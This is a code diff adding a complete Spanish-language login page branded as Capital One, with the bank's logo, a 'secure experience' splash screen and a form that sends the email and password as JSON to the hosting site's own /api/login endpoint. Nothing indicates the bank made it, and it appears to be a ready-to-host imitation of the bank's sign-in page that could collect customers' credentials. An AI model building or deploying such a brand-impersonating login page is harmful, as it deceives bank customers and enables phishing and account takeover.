@@ -1,0 +1,191 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Login • Capital One</title>
+<meta name="theme-color" content="#003a6d" />
+<style>
+  :root{
+    --blue:#003a6d;
+    --red:#d22e1e;
+    --white:#ffffff;
+    --text-dark:#0f1a2b;
+    --muted-dark:#7a8699;
+    --radius:16px;
+    --shadow:0 12px 40px rgba(0,0,0,.25);
+    --line-dark:#e5e7eb;
+  }
+
+  body{
+    margin:0;
+    font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;
+    background:var(--white);
+    color:var(--text-dark);
+    line-height:1.4;
+  }
+
+  /* Splash */
+  .loading{
+    position:fixed; inset:0; z-index:9999;
+    display:grid; place-items:center; text-align:center; padding:24px;
+    background:var(--white); color:var(--text-dark);
+    transition:opacity 2s ease, visibility 0s linear 2s;
+  }
+  body.app-ready .loading{ opacity:0; visibility:hidden; }
+  .brand__logo{ width:min(260px,60vw); margin:0 auto 18px; }
+  .spinner{
+    width:56px; height:56px; border-radius:50%;
+    border:6px solid rgba(0,0,0,.1);
+    border-top-color:var(--blue); border-right-color:var(--blue);
+    margin:6px auto 10px; animation:spin 1s linear infinite;
+  }
+  @keyframes spin{ to{ transform:rotate(360deg) } }
+
+  /* Layout */
+  .wrap{ min-height:100vh; display:grid; place-items:center; padding:24px; opacity:0; transition:opacity 1.2s ease; }
+  body.app-ready .wrap{ opacity:1; }
+
+  .card{
+    width:min(440px,92vw); border-radius:var(--radius); box-shadow:var(--shadow);
+    background:#ffffff; border:1px solid var(--line-dark); color:var(--text-dark);
+    overflow:hidden;
+  }
+  .card__inner{ padding:28px 24px 24px; }
+  .logo-container{ display:grid; place-items:center; padding:20px 24px 0; }
+  .login-logo{ width:200px; }
+
+  .card__header h1{ margin:14px 0 4px; font-size:clamp(22px,3.5vw,28px); }
+  .muted{ margin:0 0 16px; color:var(--muted-dark); }
+
+  /* Formulario */
+  .form{ display:grid; gap:14px; }
+  .field{ display:grid; gap:8px; }
+  label{ font-weight:600; }
+  input[type="text"],input[type="password"],input[type="email"]{
+    width:100%; padding:12px 0.1px; border-radius:10px;
+    border:1px solid #cdd5e1; background:#fff; color:var(--text-dark);
+    outline:none; transition:border-color .2s, box-shadow .2s;
+  }
+  input::placeholder{ color:#9aa6b2; }
+  input:focus-visible{ border-color:var(--blue); box-shadow:0 0 0 3px rgba(0,58,109,.25); }
+
+  .row{ display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap; }
+  .checkbox{ display:inline-flex; align-items:center; gap:8px; user-select:none; }
+
+  .btn.primary{
+    width:100%; padding:12px 14px; border:0; border-radius:10px;
+    background:linear-gradient(90deg,var(--blue),#00579c);
+    color:#fff; font-weight:700; cursor:pointer;
+    box-shadow:0 6px 14px rgba(0,58,109,.25);
+  }
+  .btn.primary:disabled{ opacity:.7; cursor:not-allowed; filter:grayscale(.3); }
+
+  .link{ color:var(--blue); text-decoration:none; font-weight:600; }
+  .link:hover{ text-decoration:underline; }
+
+  .form-status{ min-height:1.2em; font-size:.95rem; }
+</style>
+</head>
+<body>
+  <!-- SPLASH -->
+  <div class="loading" role="status" aria-live="polite">
+    <img class="brand__logo" src="https://upload.wikimedia.org/wikipedia/commons/9/98/Capital_One_logo.svg" alt="Capital One">
+    <div class="spinner" aria-hidden="true"></div>
+    <p>Preparando tu experiencia segura…</p>
+  </div>
+
+  <!-- LOGIN -->
+  <main class="wrap">
+    <section class="card" aria-labelledby="title">
+      <div class="logo-container">
+        <img class="login-logo" src="https://upload.wikimedia.org/wikipedia/commons/9/98/Capital_One_logo.svg" alt="Capital One">
+      </div>
+
+      <div class="card__inner">
+        <header class="card__header">
+          <h1 id="title">Inicia sesión</h1>
+          <p class="muted">Accede de forma segura a tu cuenta.</p>
+        </header>
+
+        <form id="loginForm" class="form" novalidate aria-describedby="formStatus">
+          <div class="field">
+            <label for="username">Correo</label>
+            <input id="username" name="username" type="email" required autocomplete="username"
+                   autocapitalize="none" spellcheck="false" placeholder="tucorreo@ejemplo.com">
+          </div>
+
+          <div class="field">
+            <label for="password">Contraseña</label>
+            <input id="password" name="password" type="password" required autocomplete="current-password" placeholder="••••••••">
+            <small class="hint muted" id="capsHint" hidden>Bloq Mayús activado</small>
+          </div>
+
+          <div class="row">
+            <label class="checkbox">
+              <input id="remember" name="remember" type="checkbox">
+              <span>Recordarme</span>
+            </label>
+            <a href="#" class="link">¿Olvidaste tus datos?</a>
+          </div>
+
+          <button class="btn primary" type="submit" id="submitBtn" disabled>Ingresar</button>
+          <p class="form-status" id="formStatus" role="status" aria-live="polite"></p>
+        </form>
+      </div>
+    </section>
+  </main>
+
+<script>
+  // Splash
+  window.addEventListener('load', () => {
+    setTimeout(() => {
+      document.body.classList.add('app-ready');
+      setTimeout(() => document.getElementById('username')?.focus(), 400);
+    }, 1200);
+  });
+
+  // Form
+  const u = document.getElementById('username');
+  const p = document.getElementById('password');
+  const btn = document.getElementById('submitBtn');
+  const status = document.getElementById('formStatus');
+  const capsHint = document.getElementById('capsHint');
+
+  function sync(){ btn.disabled = !(u.value.trim() && p.value.trim()); }
+  u.addEventListener('input', sync); p.addEventListener('input', sync);
+  ['keydown','keyup'].forEach(ev=>{
+    p.addEventListener(ev, e => { capsHint.hidden = !(e.getModifierState && e.getModifierState('CapsLock')); });
+  });
+
+  document.getElementById('loginForm').addEventListener('submit', async (e)=>{
+    e.preventDefault();
+    status.textContent = 'Verificando…';
+    btn.disabled = true;
+
+    const payload = {
+      correo: u.value.trim(),
+      contrasena: p.value.trim(),
+      remember: document.getElementById('remember').checked
+    };
+
+    try {
+      const r = await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'same-origin',
+        body: JSON.stringify(payload)
+      });
+      const data = await r.json().catch(()=> ({}));
+      if (!r.ok) throw new Error(data.error || 'Credenciales inválidas');
+
+      status.textContent = 'Acceso concedido. Redirigiendo…';
+      setTimeout(()=> { window.location.href = '/dashboard.html'; }, 500);
+    } catch (err) {
+      status.textContent = err.message || 'Error al iniciar sesión';
+      btn.disabled = false;
+    }
+  });
+</script>
+</body>
+</html>
